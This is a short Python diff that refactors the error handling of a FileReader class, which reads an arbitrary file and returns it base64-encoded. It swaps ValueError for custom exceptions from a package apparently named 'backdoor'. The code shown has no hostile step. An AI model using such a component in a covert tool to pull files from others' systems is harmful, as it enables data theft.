@@ -1,15 +1,18 @@
 from base64 import b64decode, b64encode
 from pathlib import Path
 
+from backdoor.exceptions.core import InvalidArgumentException
+from backdoor.files.exceptions import FileNotFoundException
+
 
 class FileReader:
 
     def read(self, path: str) -> bytes:
         fpath = Path(path).absolute()
         if not fpath.exists():
-            raise ValueError("file not found")
+            raise FileNotFoundException("file not found")
         if fpath.is_dir():
-            raise ValueError("cannot read directory")
+            raise InvalidArgumentException("cannot read directory")
         with open(fpath, mode="rb") as f:
             return b64encode(f.read())
 
